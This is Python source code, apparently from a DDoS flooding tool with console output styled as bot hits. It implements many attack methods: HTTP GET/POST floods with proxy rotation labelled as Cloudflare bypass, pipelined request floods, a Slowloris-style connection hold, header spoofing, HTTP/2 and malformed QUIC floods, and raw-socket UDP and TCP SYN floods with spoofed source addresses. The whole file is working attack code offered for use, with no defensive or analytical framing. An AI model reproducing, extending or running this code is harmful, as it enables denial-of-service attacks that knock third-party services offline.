class TLSF:
    @staticmethod
    def build():
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        ctx.minimum_version = ssl.TLSVersion.TLSv1; ctx.maximum_version = ssl.TLSVersion.TLSv1_3
        try: ctx.set_ciphers("DEFAULT@SECLEVEL=1")
        except ssl.SSLError: pass
        return ctx

class PRX:
    def __init__(self):
        self.pool = []; self.load()
    def load(self):
        p = Path("./proxy.txt")
        if p.exists(): self.pool = [ln.strip() for ln in p.read_text().splitlines() if ln.strip()]
        return len(self.pool)
    def pick(self):
        if not self.pool: return None
        return f"http://{secrets.choice(self.pool)}"
    def __len__(self): return len(self.pool)

class RB:
    def __init__(self, x):
        self.x = x; self.t0 = time.time(); self._lk = threading.Lock()
        self._last_report = 0.0; self._report_interval = 0.05
    def _tty(self):
        try: return sys.stdout.isatty() and shutil.get_terminal_size((80, 24)).columns > 0
        except Exception: return False
    def hit(self, status="ok", msg=""):
        self.x.hit(status); s = self.x.snap(); ts = datetime.now().strftime("%H:%M:%S")
        if status == "ok": tag, col = "SERVER HIT", CL.GREEN
        elif status == "closed": tag, col = "CONN CLOSED", CL.YELLOW
        else: tag, col = (msg[:18] or "FAIL"), CL.RED
        line = f"{CL.CYAN}[{ts}]{CL.RESET} {CL.RED}[CCT]{CL.RESET} {CL.WHITE}>{CL.RESET} {col}{tag}{CL.RESET} {CL.WHITE}>{CL.RESET} {CL.MAGENTA}{self.x.method}{CL.RESET} {CL.WHITE}>{CL.RESET} {CL.YELLOW}BOT#{s['total']}{CL.RESET} {CL.WHITE}>{CL.RESET} {CL.TEAL}{self.x.target}{CL.RESET} {CL.WHITE}>{CL.RESET} {col}RPS:{s['total']}{CL.RESET}"
        with self._lk:
            now = time.time()
            if self._tty():
                sys.stdout.write(line + "\n"); sys.stdout.flush()
            else:
                if now - self._last_report >= self._report_interval:
                    self._last_report = now
                    sys.stdout.write(line + "\n"); sys.stdout.flush()
    def init(self):
        self.x.reset(); self.t0 = time.time(); ts = datetime.now().strftime("%H:%M:%S")
        print(f"{CL.CYAN}[{ts}]{CL.RESET} {CL.RED}[CCT]{CL.RESET} {CL.GREEN}INIT {self.x.method}{CL.RESET}")
        print(f"{CL.CYAN}[{ts}]{CL.RESET} {CL.RED}[CCT]{CL.RESET} {CL.YELLOW}CPU:{multiprocessing.cpu_count()} | DEV:{DEV} | OWNER:{OWNER}{CL.RESET}")
    def final(self):
        s = self.x.snap(); dt = max(1e-3, time.time()-self.t0)
        print(f"{CL.CYAN}[DONE]{CL.RESET} total={s.get('total',0)} ok={s.get('ok',0)} closed={s.get('closed',0)} err={s.get('err',0)} avg_rps={s.get('total',0)/dt:.1f} | DEV:{DEV}")

class HSK:
    def __init__(self, env): self.env = env
    def udp(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if self.env.reuse_ok:
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except OSError: pass
        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
        except OSError: pass
        return s
    def tcp(self, timeout=0.5):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError: pass
        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        except OSError: pass
        if self.env.reuse_ok:
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except OSError: pass
        s.settimeout(timeout); return s
    def raw_tcp(self):
        if not (self.env.is_root and self.env.raw_ok and self.env.has_ipproto_raw): return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            try: s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except OSError: pass
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
            except OSError: pass
            return s
        except (PermissionError, OSError): return None
    def raw_udp(self):
        if not (self.env.is_root and self.env.raw_ok and self.env.has_ipproto_raw): return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            try: s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except OSError: pass
            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
            except OSError: pass
            return s
        except (PermissionError, OSError): return None

class AsyncEngine:
    @staticmethod
    async def _worker(session, xd, x, rb, verb, end, per, proxy_url):
        url = xd.target; body = None
        if verb == "POST": body = f"data={base64.b64encode(secrets.choice(HDR.UAS).encode()).decode()}"
        while x.running and time.time() < end:
            h = HDR.build()
            if verb == "POST": h["Content-Type"] = "application/x-www-form-urlencoded"
            for _ in range(per):
                if not x.running or time.time() >= end: break
                try:
                    async with session.request(verb, url, headers=h, data=body if verb=="POST" else None, proxy=proxy_url, ssl=False, allow_redirects=False, compress=False) as r:
                        if verb != "HEAD": await r.read()
                        rb.hit("ok")
                except (aiohttp.ClientError, asyncio.TimeoutError, socket.error): rb.hit("closed")
                except Exception as e: rb.hit("err", str(e))
    @classmethod
    def run(cls, xd, x, rb, verb, name, prx=None, use_proxy=False):
        x.method = name; x.target = urlparse(xd.target).netloc; x.running = True
        end = time.time() + xd.duration; rb.init()
        n = min(xd.threads, MAX_TH); per = 20
        async def main():
            conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True, force_close=False, enable_cleanup_closed=True, ssl=False)
            to = aiohttp.ClientTimeout(total=10, connect=5, sock_read=10)
            proxy_url = prx.pick() if (use_proxy and prx) else None
            async with aiohttp.ClientSession(connector=conn, timeout=to, headers={"Accept-Encoding":"gzip, deflate"}) as sess:
                tasks = [asyncio.create_task(cls._worker(sess, xd, x, rb, verb, end, per, proxy_url)) for _ in range(n)]
                await asyncio.gather(*tasks, return_exceptions=True)
        try: asyncio.run(main())
        except KeyboardInterrupt: x.running = False
        rb.final()

def _split(url):
    u = urlparse(url.rstrip())
    return {"uri": u.path or "/","host": u.netloc,"scheme": u.scheme,"port": u.netloc.split(":")[1] if ":" in u.netloc else ("443" if u.scheme=="https" else "80")}

class PipeEngine:
    @staticmethod
    def _build(tgt, method="GET", extra=None):
        h = HDR.build()
        req = f"{method} {tgt['uri']} HTTP/1.1\r\nHost: {tgt['host']}\r\n"
        for k, v in h.items(): req += f"{k}: {v}\r\n"
        if extra: req += extra
        req += "Connection: keep-alive\r\n\r\n"
        return req.encode()
    @classmethod
    def run(cls, xd, x, rb, name, depth, method="GET", extra=None):
        tgt = _split(xd.target); x.method = name; x.target = tgt["host"]; x.running = True
        end = time.time() + xd.duration; ctx = TLSF.build(); rb.init()
        use_tls = tgt["scheme"] == "https"; port = int(tgt["port"])
        def w():
            while x.running and time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    s.settimeout(3); s.connect((tgt["host"], port))
                    if use_tls: s = ctx.wrap_socket(s, server_hostname=tgt["host"])
                    payload = cls._build(tgt, method, extra) * depth
                    while x.running and time.time() < end:
                        try:
                            s.sendall(payload); s.setblocking(False)
                            try: s.recv(65536)
                            except (BlockingIOError, ssl.SSLWantReadError): pass
                            except (ConnectionError, OSError): raise
                            s.setblocking(True); rb.hit("ok")
                            for _ in range(depth-1): x.hit("ok")
                        except (ConnectionError, socket.error, OSError): rb.hit("closed"); break
                    try: s.close()
                    except Exception: pass
                except Exception: rb.hit("closed")
        tc = min(xd.threads, MAX_TH)
        with ThreadPoolExecutor(max_workers=tc) as ex:
            for _ in range(tc): ex.submit(w)
        rb.final()

class SlowEngine:
    @classmethod
    def run(cls, xd, x, rb, hsk, per=500):
        tgt = _split(xd.target); x.method = "SLOW-HOLD"; x.target = tgt["host"]; x.running = True
        end = time.time() + xd.duration; ctx = TLSF.build(); rb.init()
        port = int(tgt["port"]); use_tls = tgt["scheme"] == "https"
        def w():
            socks = []
            while x.running and time.time() < end:
                while len(socks) < per and x.running:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        try: s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
                        except OSError: pass
                        s.settimeout(3); s.connect((tgt["host"], port))
                        if use_tls: s = ctx.wrap_socket(s, server_hostname=tgt["host"])
                        s.send(f"GET /?{secrets.randbelow(999999)} HTTP/1.1\r\n".encode())
                        s.send(f"Host: {tgt['host']}\r\n".encode())
                        s.send(f"User-Agent: {secrets.choice(HDR.UAS)}\r\n".encode())
                        s.send(b"Accept-language: en-US,en\r\nConnection: keep-alive\r\n")
                        socks.append(s); rb.hit("ok")
                    except Exception: rb.hit("closed"); break
                if not socks: time.sleep(1); continue
                for _ in range(100):
                    if not x.running or time.time() >= end: break
                    alive = []
                    for s in socks:
                        try: s.send(f"X-a: {secrets.randbelow(999999)}\r\n".encode()); alive.append(s)
                        except Exception:
                            rb.hit("closed")
                            try: s.close()
                            except Exception: pass
                    socks = alive
                    if not socks: break
                    time.sleep(3)
                for s in socks:
                    try: s.close()
                    except Exception: pass
                socks = []
        tc = min(xd.threads, 5000)
        with ThreadPoolExecutor(max_workers=tc) as ex:
            for _ in range(tc): ex.submit(w)
        rb.final()

class H2Engine:
    @classmethod
    def run(cls, xd, x, rb, name):
        x.method = name; x.target = urlparse(xd.target).netloc; x.running = True
        end = time.time() + xd.duration; rb.init()
        n = min(xd.threads, MAX_TH)
        def worker():
            while x.running and time.time() < end:
                try:
                    with httpx.Client(http2=True, verify=False, timeout=5.0, limits=httpx.Limits(max_connections=None, max_keepalive_connections=None)) as c:
                        while x.running and time.time() < end:
                            try:
                                h = HDR.build(); h["Connection"] = "close"
                                r = c.get(xd.target, headers=h)
                                if r.status_code > 0: rb.hit("ok")
                                else: rb.hit("closed")
                            except (httpx.HTTPError, socket.error): rb.hit("closed")
                            except Exception as e: rb.hit("err", str(e))
                except Exception: rb.hit("closed")
        with ThreadPoolExecutor(max_workers=n) as ex:
            for _ in range(n): ex.submit(worker)
        rb.final()

class H3Engine:
    QUIC_VERSIONS = [b"\x00\x00\x00\x01", b"\xff\x00\x00\x1d", b"\xff\x00\x00\x1e", b"\xff\x00\x00\x20"]
    FRAME_TYPES = [b"\x00", b"\x01", b"\x02", b"\x03", b"\x04", b"\x05", b"\x06", b"\x07"]
    @classmethod
    def _build_quic_payload(cls):
        ver = secrets.choice(cls.QUIC_VERSIONS)
        dcid_len = secrets.randbelow(20) + 8
        dcid = secrets.token_bytes(dcid_len)
        scid_len = secrets.randbelow(20) + 8
        scid = secrets.token_bytes(scid_len)
        length = secrets.randbelow(500) + 100
        pkt_num = secrets.token_bytes(4)
        frame = secrets.choice(cls.FRAME_TYPES) + secrets.token_bytes(length)
        hdr = b"\xc0" + ver + bytes([dcid_len]) + dcid + bytes([scid_len]) + scid + b"\x00" + struct.pack("!H", length) + pkt_num + frame
        return hdr + secrets.token_bytes(secrets.randbelow(400) + 100)
    @classmethod
    def _build_quic_initial(cls):
        ver = b"\x00\x00\x00\x01"
        dcid_len = 8
        dcid = secrets.token_bytes(dcid_len)
        scid_len = 8
        scid = secrets.token_bytes(scid_len)
        length = 1200 - 7 - dcid_len - 1 - scid_len - 1 - 4
        pkt_num = secrets.token_bytes(4)
        frame = b"\x06" + b"\x00" * (length - 1)
        return b"\xc0" + ver + bytes([dcid_len]) + dcid + bytes([scid_len]) + scid + b"\x00" + struct.pack("!H", length) + pkt_num + frame
    @classmethod
    def _build_fragment(cls):
        base = cls._build_quic_initial()
        frag = bytearray()
        frag.extend(b"\x00\x00\x00\x01")
        frag.extend(struct.pack("!H", len(base) & 0xffff))
        frag.extend(secrets.token_bytes(3))
        frag.extend(base)
        return bytes(frag)
    @classmethod
    def run(cls, xd, x, rb, name, env):
        x.method = name; x.target = urlparse(xd.target).netloc; x.running = True
        end = time.time() + xd.duration; rb.init()
        tgt = _split(xd.target)
        host = tgt["host"]; port = int(tgt["port"])
        n = min(xd.threads, MAX_TH)
        rooted = env.is_root and env.raw_ok
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            if rooted:
                try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
                except OSError: pass
            else:
                try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
                except OSError: pass
            try:
                while x.running and time.time() < end:
                    try:
                        mode = secrets.randbelow(3)
                        if mode == 0:
                            payload = cls._build_quic_payload()
                        elif mode == 1:
                            payload = cls._build_quic_initial()
                        else:
                            payload = cls._build_fragment()
                        s.sendto(payload, (host, port))
                        rb.hit("ok")
                        s.sendto(payload, (host, port))
                        rb.hit("ok")
                        s.sendto(payload, (host, port))
                        rb.hit("ok")
                        s.sendto(payload, (host, port))
                        rb.hit("ok")
                        s.sendto(payload, (host, port))
                        rb.hit("ok")
                    except Exception: rb.hit("closed")
            finally:
                try: s.close()
                except Exception: pass
        with ThreadPoolExecutor(max_workers=n) as ex:
            for _ in range(n): ex.submit(worker)
        rb.final()

class NASIF:
    @staticmethod
    def http_get(xd, x, rb, hsk, prx): AsyncEngine.run(xd, x, rb, "GET", "HTTP-GET")
    @staticmethod
    def http_post(xd, x, rb, hsk, prx): AsyncEngine.run(xd, x, rb, "POST", "HTTP-POST")
    @staticmethod
    def http_head(xd, x, rb, hsk, prx): AsyncEngine.run(xd, x, rb, "HEAD", "HTTP-HEAD")
    @staticmethod
    def cf_bypass(xd, x, rb, hsk, prx): AsyncEngine.run(xd, x, rb, "GET", "CF-BYPASS")
    @staticmethod
    def cf_proxy(xd, x, rb, hsk, prx): AsyncEngine.run(xd, x, rb, "GET", "CF-PROXY", prx=prx, use_proxy=True)
    @staticmethod
    def pipeline(xd, x, rb, hsk, prx): PipeEngine.run(xd, x, rb, "PIPELINE", 64, "GET")
    @staticmethod
    def shield(xd, x, rb, hsk, prx): PipeEngine.run(xd, x, rb, "SHIELD", 32, "GET")
    @staticmethod
    def socket_flood(xd, x, rb, hsk, prx): PipeEngine.run(xd, x, rb, "SOCKET", 16, "GET")
    @staticmethod
    def hulk(xd, x, rb, hsk, prx):
        old = xd.target
        xd.target = f"{xd.target}?r={secrets.randbelow(999999)}"
        try: PipeEngine.run(xd, x, rb, "HULK", 24, "GET")
        finally: xd.target = old
    @staticmethod
    def slow_hold(xd, x, rb, hsk, prx): SlowEngine.run(xd, x, rb, hsk, per=500)
    @staticmethod
    def xff_spoof(xd, x, rb, hsk, prx):
        extra = f"X-Forwarded-For: {_rip()}\r\nClient-IP: {_rip()}\r\nX-Real-IP: {_rip()}\r\n"
        PipeEngine.run(xd, x, rb, "XFF-SPOOF", 16, "GET", extra)
    @staticmethod
    def h2_multiplex(xd, x, rb, hsk, prx): H2Engine.run(xd, x, rb, "HTTP2-MUX")
    @staticmethod
    def h3_quic(xd, x, rb, hsk, prx): H3Engine.run(xd, x, rb, "HTTP3-QUIC", hsk.env)

    @staticmethod
    def _ud_rooted(xd, x, rb, name, payload, hsk):
        x.method = name; x.target = xd.target; x.running = True
        end = time.time() + xd.duration; rb.init()
        env = hsk.env
        raw = hsk.raw_udp()
        try:
            dst_ip = socket.gethostbyname(xd.target) if not xd.target.replace(".", "").isdigit() else xd.target
        except Exception:
            dst_ip = xd.target
        if raw is not None:
            def w():
                while x.running and time.time() < end:
                    try:
                        ip_hdr = _build_ipv4_header(_rip(), dst_ip, 17, 8 + len(payload))
                        udp_hdr = struct.pack("!HHHH", secrets.randbelow(65535)+1, int(xd.port), 8 + len(payload), 0)
                        pkt = ip_hdr + udp_hdr + payload
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                    except Exception: rb.hit("closed")
            tc = min(xd.threads, 1000)
            with ThreadPoolExecutor(max_workers=tc) as ex:
                for _ in range(tc): ex.submit(w)
            try: raw.close()
            except Exception: pass
            rb.final(); return
        if env.has_scapy and env.raw_ok:
            from scapy.all import IP, UDP, Raw, send
            def w2():
                while x.running and time.time() < end:
                    try:
                        pkt = IP(src=_rip(), dst=dst_ip) / UDP(sport=secrets.randbelow(65535)+1, dport=int(xd.port)) / Raw(load=payload)
                        send(pkt, verbose=False); rb.hit("ok")
                    except Exception: rb.hit("closed")
            tc = min(xd.threads, 500)
            with ThreadPoolExecutor(max_workers=tc) as ex:
                for _ in range(tc): ex.submit(w2)
            rb.final(); return
        def w3():
            s = hsk.udp()
            try:
                while x.running and time.time() < end:
                    try:
                        s.sendto(payload, (dst_ip, int(xd.port))); rb.hit("ok")
                    except Exception: rb.hit("closed")
            finally:
                try: s.close()
                except Exception: pass
        tc = min(xd.threads, 1000)
        with ThreadPoolExecutor(max_workers=tc) as ex:
            for _ in range(tc): ex.submit(w3)
        rb.final()

    @staticmethod
    def _tcp_rooted(xd, x, rb, hsk):
        x.method = "TCP-SYN-RAW"; x.target = xd.target; x.running = True
        end = time.time() + xd.duration; rb.init()
        env = hsk.env
        try:
            dst_ip = socket.gethostbyname(xd.target) if not xd.target.replace(".", "").isdigit() else xd.target
        except Exception:
            dst_ip = xd.target
        raw = hsk.raw_tcp()
        if raw is not None:
            def w():
                while x.running and time.time() < end:
                    try:
                        src = _rip()
                        sport = secrets.randbelow(65535) + 1
                        seq = secrets.randbelow(2**32)
                        tcp_hdr = _build_tcp_syn(src, dst_ip, sport, int(xd.port), seq)
                        ip_hdr = _build_ipv4_header(src, dst_ip, 6, len(tcp_hdr))
                        pkt = ip_hdr + tcp_hdr
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                        raw.sendto(pkt, (dst_ip, 0))
                        rb.hit("ok")
                    except Exception: rb.hit("closed")
            tc = min(xd.threads, 500)
            with ThreadPoolExecutor(max_workers=tc) as ex:
                for _ in range(tc): ex.submit(w)
            try: raw.close()
            except Exception: pass
            rb.final(); return
        if env.has_scapy and env.raw_ok:
            from scapy.all import IP, TCP, send
            def w2():
                while x.running and time.time() < end:
                    try:
                        pkt = IP(src=_rip(), dst=dst_ip) / TCP(sport=secrets.randbelow(65535)+1, dport=int(xd.port), flags="S", seq=secrets.randbelow(2**32))
                        send(pkt, verbose=False); rb.hit("ok")
                    except Exception: rb.hit("closed")
            tc = min(xd.threads, 500)
            with ThreadPoolExecutor(max_workers=tc) as ex:
                for _ in range(tc): ex.submit(w2)
            rb.final(); return
        def w3():
            while x.running and time.time() < end:
                try:
                    s = hsk.tcp(0.3); s.connect((dst_ip, int(xd.port)))
                    enc = base64.b64encode(f"GET / HTTP/1.1\r\nHost: {xd.target}\r\n\r\n".encode()).decode()
                    s.send(enc.encode()); s.close(); rb.hit("ok")
                except Exception: rb.hit("closed")
        tc = min(xd.threads, 2000)
        with ThreadPoolExecutor(max_workers=tc) as ex:
            for _ in range(tc): ex.submit(w3)
        rb.final()

    @staticmethod
    def tcp_syn(xd, x, rb, hsk, prx): NASIF._tcp_rooted(xd, x, rb, hsk)
    @staticmethod
    def udp_flood(xd, x, rb, hsk, prx): NASIF._ud_rooted(xd, x, rb, "UDP-FLOOD", secrets.token_bytes(60000), hsk)
